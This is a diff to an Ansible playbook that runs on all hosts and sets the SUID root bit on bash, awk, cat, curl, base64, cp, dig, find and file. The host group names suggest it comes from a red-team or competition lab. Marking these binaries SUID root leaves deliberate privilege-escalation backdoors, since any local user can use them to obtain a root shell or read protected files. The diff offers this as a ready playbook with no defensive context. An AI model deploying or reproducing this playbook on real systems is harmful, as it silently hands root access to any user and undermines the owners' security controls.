@@ -1,24 +1,21 @@
-- hosts: centosECOMM:fedoraMailWeb
+- hosts: all
   become: true
-  ignore_errors: true
   tasks:
-    - name: Setup SUID for awk
+    - name: Set SUID for specified binaries
       file:
-        path: /usr/bin/awk
+        path: "{{ item }}"
         owner: root
         group: root
         mode: '04755'
-    
-    - name: Setup SUID for cat
-      file:
-        path: /usr/bin/cat
-        owner: root
-        group: root
-        mode: '04755'
-
-    - name: Setup SUID for curl
-      file:
-        path: /usr/bin/curl
-        owner: root
-        group: root
-        mode: '04755'
+      ignore_errors: yes
+      loop:
+        - /usr/bin/awk
+        - /usr/bin/cat
+        - /usr/bin/curl
+        - /usr/bin/base64
+        - /usr/bin/bash
+        - /usr/bin/cp
+        - /usr/bin/curl
+        - /usr/bin/dig
+        - /usr/bin/find
+        - /usr/bin/file
